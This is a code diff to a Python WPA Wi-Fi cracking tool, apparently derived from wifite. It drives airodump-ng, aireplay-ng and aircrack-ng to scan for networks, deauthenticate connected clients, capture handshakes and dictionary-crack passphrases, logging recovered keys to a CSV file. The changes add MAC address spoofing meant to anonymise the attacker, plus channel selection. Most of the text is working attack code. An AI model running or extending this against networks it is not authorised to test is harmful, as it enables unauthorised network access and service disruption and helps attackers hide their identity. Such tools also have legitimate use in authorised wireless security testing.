@@ -41,6 +41,19 @@ def mac_search(string):
         return mac_addr
     except:return ""
 
+def program_exists(program):
+    """
+        Uses 'which' (linux command) to check if a program is installed.
+    """
+    proc = Popen(['which', program], stdout=PIPE, stderr=PIPE, encoding='utf-8')
+    txt = proc.communicate()
+    if txt[0].strip() == '' and txt[1].strip() == '':
+        return False
+    if txt[0].strip() != '' and txt[1].strip() == '':
+        return True
+
+    return not (txt[1].strip() == '' or txt[1].find('no %s in' % program) != -1)
+
 def sec_to_hms(sec):
     """
         Converts integer sec to h:mm:ss format
@@ -67,20 +80,6 @@ def send_interrupt(process):
         pass  # 'process' is not defined
     except AttributeError:
         pass  # Trying to kill "None"
-
-def get_mac_address(iface):
-    """
-        Returns MAC address of "iface".
-    """
-    proc = Popen(['ifconfig', iface], stdout=PIPE, stderr=DN, encoding='utf-8')
-    proc.wait()
-    mac = ''
-    output = proc.communicate()[0]
-    mac_regex = ('[a-zA-Z0-9]{2}-' * 6)[:-1]
-    match = re.search(' (%s)' % mac_regex, output)
-    if match:
-        mac = match.groups()[0].replace('-', ':')
-    return mac
 
 def generate_random_mac(old_mac):
     """
@@ -183,17 +182,29 @@ class Wpa_Attack:
 
     def __init__(self):
         self.iface=""
-        self.target=""
+        self.origin_mac=""
+        self.current_mac=""
+        self.channel=""
+        self.target_bssid=""
         self.target_channel=""
         self.target_essid=""
         self.target_key=""
         self.WPA_DEAUTH_COUNT=1
         self.WPA_ATTACK_TIMEOUT=300
         self.WPA_DEAUTH_TIMEOUT=10
-        self.WPA_DICTIONARY = ''
+        self.WPA_DICTIONARY = ""
+        self.DO_NOT_CHANGE_MAC = True
+
         self.tempdir=sys.path[0]+os.sep+'temp'
+        if not os.path.exists(self.tempdir):
+            os.mkdir(self.tempdir)
         self.wpa_handshakedir=sys.path[0]+os.sep+'handshake'
+        if not os.path.exists(self.wpa_handshakedir):
+            os.mkdir(self.wpa_handshakedir)
         self.cracked_csv=sys.path[0]+os.sep+'cracked.csv'
+        if not os.path.exists(self.cracked_csv):
+            with open(self.cracked_csv,'w') as f:
+                f.write("SSID,BSSID,PASSWORD\n")
 
     def ConfirmRunningAsRoot(self):
         if os.getuid() != 0:
@@ -206,21 +217,36 @@ class Wpa_Attack:
             print(O+' [!]'+R+' WARNING:'+G+' wpa_crack'+W+' must be run on '+O+'linux'+W)
             exit(1)
 
-    def CreateFolder(self):
-        if not os.path.exists(self.tempdir):
-            os.mkdir(self.tempdir)
-        if not os.path.exists(self.wpa_handshakedir):
-            os.mkdir(self.wpa_handshakedir)
-        if not os.path.exists(self.cracked_csv):
-            with open(self.cracked_csv,'w') as f:
-                f.write("SSID,BSSID,PASSWORD\n")
+    def initial_check(self):
+        """
+            Ensures required programs are installed.
+        """
+        airs = ['aircrack-ng', 'airodump-ng', 'aireplay-ng', 'airmon-ng']
+        for air in airs:
+            if program_exists(air): continue
+            print(R + ' [!]' + O + ' required program not found: %s' % (R + air + W))
+            print(R + ' [!]' + O + ' this program is bundled with the aircrack-ng suite:' + W)
+            print(R + ' [!]' + O + '        ' + C + 'http://www.aircrack-ng.org/' + W)
+            print(R + ' [!]' + O + ' or: ' + W + 'sudo apt-get install aircrack-ng\n' + W)
+            exit(1)
+
+        if not program_exists('iwconfig'):
+            print(R + ' [!]' + O + ' wifite requires the program %s\n' % (R + 'iwconfig' + W))
+            exit(1)
+
+        if not program_exists('ifconfig'):
+            print(R + ' [!]' + O + ' wifite requires the program %s\n' % (R + 'ifconfig' + W))
+            exit(1)
 
     def build_opt_parser(self):
         argparser = argparse.ArgumentParser()
         argparser.add_argument('--dict', help='Specificy dictionary to use when cracking WPA.', action='store',
                                dest='dic')
         argparser.add_argument('-dict', help=argparse.SUPPRESS, action='store', dest='dic')
-
+        argparser.add_argument('--mac', help='Anonymize MAC address.', action='store_true', default=False,
+                                  dest='mac_anon')
+        argparser.add_argument('-mac', help=argparse.SUPPRESS, action='store_true', default=False, dest='mac_anon')
+        argparser.add_argument('-c', help='Channel to scan for targets.', action='store', dest='channel')
         return argparser
 
     def handle_args(self):
@@ -242,12 +268,24 @@ class Wpa_Attack:
                         print(R + ' [!]' + O + ' WPA dictionary file not found: %s' % (options.dic))
             else:
                 print(R + ' [!]' + O + ' WPA dictionary file not given!')
-                exit(1)
+            if options.channel:
+                try:
+                    self.channel = int(options.channel)
+                except ValueError:
+                    print(O + ' [!]' + R + ' invalid channel: ' + O + options.channel + W)
+                except IndexError:
+                    print(O + ' [!]' + R + ' no channel given!' + W)
+                else:
+                    print(GR + ' [+]' + W + ' channel set to %s' % (G + str(self.channel) + W))
+            if options.mac_anon:
+                print(GR + ' [+]' + W + ' mac address anonymizing ' + G + 'enabled' + W)
+                print(O + '     not: only works if device is not already in monitor mode!' + W)
+                self.DO_NOT_CHANGE_MAC = False
         except IndexError:
             print('\nIndexerror')
 
-
     def start_monitor_mode(self):
+        self.mac_anonymize()
         proc = Popen(['iwconfig',self.iface],stdout=PIPE,stderr=DEVNULL,encoding='utf-8')
         if proc.communicate()[0].find('Mode:Monitor')==-1:
             call(['airmon-ng','start',self.iface],stdout=DEVNULL,stderr=DEVNULL)
@@ -263,6 +301,7 @@ class Wpa_Attack:
         if proc.communicate()[0].find('Mode:Monitor')!=-1:
             call(['airmon-ng','stop',self.iface],stdout=DEVNULL,stderr=DEVNULL)
             print(O + ' [!] ' + W + 'Stop Wireless interface Monitor mode: ' + O + self.iface + W)
+        self.mac_change_back()
 
     def initial_ifaces(self):
         proc = Popen(['iwconfig'],stdout=PIPE,stderr=DEVNULL,encoding='utf-8')
@@ -271,7 +310,7 @@ class Wpa_Attack:
             if ord(line[0]) != 32:  # Doesn't start with space
                 self.iface = line[:line.find(' ')]  # is the interface
                 self.stop_monitor_mode()
-        self.iface=''
+        self.iface=""
 
     def get_iface(self):
         print(GR + ' [+]' + W + ' scanning for wireless devices...')
@@ -294,31 +333,67 @@ class Wpa_Attack:
                         "[1-%s]"%(len(ifaces))+ W + ": ")
                     if int(ri) >= 1 and int(ri) <= len(ifaces):break
                 self.iface=ifaces[int(ri)-1]
-                self.start_monitor_mode()
             except KeyboardInterrupt:
                 print('\n ' + R + '(^C)' + O + ' interrupted')
                 exit(1)
         elif len(ifaces)==1:
             self.iface=ifaces[0]
-            self.start_monitor_mode()
         else:
             print(R + ' [!]' + O + " no wireless interfaces were found." + W)
             print(R + ' [!]' + O + " you need to plug in a wifi device or install drivers." + W)
             exit(1)
 
-    def scan(self,channel=0):
+    def mac_anonymize(self):
+        """
+            Changes MAC address of 'iface' to a random MAC.
+            Only randomizes the last 6 digits of the MAC, so the vender says the same.
+            Stores old MAC address and the interface in ORIGINAL_IFACE_MAC
+        """
+        if self.DO_NOT_CHANGE_MAC:return
+        proc = Popen(['ifconfig', self.iface], stdout=PIPE, stderr=DEVNULL, encoding='utf-8')
+        proc.wait()
+        self.origin_mac = mac_search(proc.communicate()[0])
+        if self.origin_mac:
+            self.current_mac = generate_random_mac(self.origin_mac)
+            call(['ifconfig', self.iface, 'down'])
+            sys.stdout.write(GR + " [+]" + W + " changing %s's MAC from %s to %s..." % \
+                (G + self.iface + W, G + self.origin_mac + W, O + self.current_mac + W))
+            sys.stdout.flush()
+            proc = Popen(['ifconfig', self.iface, 'hw', 'ether', self.current_mac], stdout=PIPE, stderr=DEVNULL)
+            proc.wait()
+            call(['ifconfig', self.iface, 'up'], stdout=DEVNULL, stderr=DEVNULL)
+            print('done')
+
+    def mac_change_back(self):
+        """
+            Changes MAC address back to what it was before attacks began.
+        """
+        if self.current_mac:
+            sys.stdout.write(GR + " [+]" + W + " changing %s's mac back to %s..." % \
+                (G + self.iface + W, G + self.origin_mac + W))
+            sys.stdout.flush()
+
+            call(['ifconfig', self.iface, 'down'], stdout=DEVNULL, stderr=DEVNULL)
+            proc = Popen(['ifconfig', self.iface, 'hw', 'ether', self.origin_mac], stdout=PIPE, stderr=DEVNULL)
+            proc.wait()
+            call(['ifconfig', self.iface, 'up'], stdout=DEVNULL, stderr=DEVNULL)
+            print("done")
+        else:return
+
+    def scan(self):
+        self.get_iface()
+        self.start_monitor_mode()
         airodump_file_prefix = os.path.join(self.tempdir, 'wifite')
         csv_file = airodump_file_prefix + '-01.csv'
-        # cap_file = airodump_file_prefix + '-01.cap'
         temp_file = self.tempdir+os.sep+'*'
         os.system('rm -rf '+temp_file)
         command = ['airodump-ng',
                    '-a',  # only show associated clients
                    '--write-interval', '1', # Write every second
                    '-w', airodump_file_prefix]  # output file
-        if channel != 0:
+        if self.channel:
             command.append('-c')
-            command.append(str(channel))
+            command.append(str(self.channel))
         command.append(self.iface)
         proc = Popen(command, stdout=DEVNULL, stderr=DEVNULL, encoding='utf-8')
         time_started = time.time()
@@ -352,11 +427,11 @@ class Wpa_Attack:
             os.system('clear')
             self.display_targets()
             try:
-                while not self.target:
+                while not self.target_bssid:
                     ri = input(GR + "\n [+]" + W + " select " + G + "target number" + W + \
                         " (" + G + "1-%s): " % (str(len(self.targets)) + W))
                     if int(ri) >= 1 and int(ri) <= len(self.targets):break
-                self.target=self.targets[int(ri)-1][0]
+                self.target_bssid=self.targets[int(ri)-1][0]
                 self.target_channel=self.targets[int(ri)-1][1][1]
                 self.target_essid=self.targets[int(ri)-1][1][0]
             except KeyboardInterrupt:
@@ -417,7 +492,7 @@ class Wpa_Attack:
             Returns True if found, False otherwise.
         """
         # if not program_exists('aircrack-ng'): return False
-        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + self.target + ' ' + capfile
+        crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + self.target_bssid + ' ' + capfile
         proc_crack = Popen(crack, stdout=PIPE, stderr=DEVNULL, shell=True, encoding='utf-8')
         proc_crack.wait()
         txt = proc_crack.communicate()[0]
@@ -430,7 +505,6 @@ class Wpa_Attack:
             This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
             they can do so manually.
         """
-
         print(GR + '\n [00:00:00]' + W + ' cracking %s with %s' % (G + self.target_essid + W, G + 'aircrack-ng' + W))
         wpakey_file = self.tempdir + os.sep + 'wpakey.txt'
         output_file = self.tempdir + os.sep + 'output.txt'
@@ -438,7 +512,7 @@ class Wpa_Attack:
                '-a', '2',  # WPA crack
                '-w', self.WPA_DICTIONARY,  # Wordlist
                '-l', wpakey_file,  # Save key to file
-               '-b', self.target,  # BSSID of target
+               '-b', self.target_bssid,  # BSSID of target
                capfile]
 
         proc = Popen(cmd, stdout=open(output_file, 'a'), stderr=DEVNULL, encoding='utf-8')
@@ -454,10 +528,10 @@ class Wpa_Attack:
                         self.target_key = inf.read().strip()
                         inf.close()
 
-                        print(GR + '\n [+]' + W + ' cracked %s (%s)!' % (G + self.target_essid + W, G + self.target + W))
+                        print(GR + '\n [+]' + W + ' cracked %s (%s)!' % (G + self.target_essid + W, G + self.target_bssid + W))
                         print(GR + ' [+]' + W + ' key:    "%s"\n' % (C + self.target_key + W))
                         with open(self.cracked_csv,'a') as f:
-                            f.write(self.target_essid+','+self.target+','+self.target_key+'\n')
+                            f.write(self.target_essid+','+self.target_bssid+','+self.target_key+'\n')
                     else:
                         # Did not crack
                         print(R + '\n [!]' + R + 'crack attempt failed' + O + ': passphrase not in dictionary' + W)
@@ -490,12 +564,11 @@ class Wpa_Attack:
         csv_file = file_prefix + '-01.csv'
         temp_cap_file = file_prefix + '-01.cap'
         try:
-            # Start airodump-ng process to capture handshakes
             cmd = ['airodump-ng',
                    '-w', file_prefix,
                    '-c', self.target_channel,
                    '--write-interval', '1',
-                   '--bssid', self.target,
+                   '--bssid', self.target_bssid,
                    self.iface]
             proc_read = Popen(cmd, stdout=DEVNULL, stderr=DEVNULL, encoding='utf-8')
             proc_deauth = None
@@ -524,7 +597,7 @@ class Wpa_Attack:
                                    '--ignore-negative-one',
                                    '--deauth',
                                    str(self.WPA_DEAUTH_COUNT),  # Number of packets to send
-                                   '-a', self.target]
+                                   '-a', self.target_bssid]
                             cmd.append('-c')
                             cmd.append(client)
                             cmd.append(self.iface)
@@ -549,7 +622,7 @@ class Wpa_Attack:
                 send_interrupt(proc_read)
                 send_interrupt(proc_deauth)
                 cap_file = self.wpa_handshakedir + os.sep + re.sub(r'[^a-zA-Z0-9_-]', '', \
-                    self.target_essid) + '_' + self.target.replace(':', '-') + '_' + \
+                    self.target_essid) + '_' + self.target_bssid.replace(':', '-') + '_' + \
                 str(time.strftime("%M%S",time.localtime())) + '.cap'
                 copy(temp_cap_file,cap_file)
                 print("\n %s %shandshake captured%s! saved as:" \
@@ -569,11 +642,10 @@ class Wpa_Attack:
 
     def Start(self):
         self.handle_args()
-        self.CreateFolder()
+        self.initial_check()
         self.ConfirmRunningAsRoot()
         self.ConfirmCorrectPlatform()
         self.initial_ifaces()
-        self.get_iface()
         self.scan()
         self.wpa_get_handshake()
 
